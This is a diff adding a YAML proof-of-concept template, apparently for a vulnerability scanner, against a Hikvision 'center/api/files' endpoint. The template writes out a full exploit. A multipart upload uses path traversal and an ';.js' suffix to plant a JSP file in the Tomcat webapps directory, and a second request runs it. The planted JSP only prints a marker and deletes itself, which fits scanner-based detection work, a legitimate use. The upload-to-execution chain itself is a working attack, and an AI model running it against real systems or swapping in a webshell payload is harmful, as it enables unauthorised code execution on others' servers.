@@ -1,0 +1,30 @@
+name: poc-yaml-hikvision-center-api-filesupload
+manual: true
+transport: http
+set:
+    s1: randomLowercase(8)
+    s2: randomLowercase(8)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /center/api/files;.js
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{s2}}.jsp\"\r\nContent-Type: image/png\r\n\r\n<% out.println(\"{{s1}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(string(s2))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /clusterMgr/{{s2}}.jsp;.js
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(s1)
+expression: r0() && r1()
+detail:
+    author: 2husky
+    links:
+        - https://www.exploit-db.com/
